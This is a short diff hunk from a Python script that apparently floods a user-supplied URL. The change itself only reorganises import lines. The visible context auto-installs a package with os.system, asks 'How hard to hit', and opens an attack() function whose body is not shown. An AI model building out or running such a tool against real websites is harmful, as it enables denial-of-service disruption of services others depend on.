@@ -14,7 +14,9 @@ try:
 except:
   print("Installing Dependency: Threading")
   os.system("pip3 install Threading")
-import threading, time, pyautogui
+import threading
+import pyautogui
+import time
 ip = input("URL: ")
 count = input("How hard to hit: 1-50 (Only go more than 3 if your computer supports it): ")
 def attack():
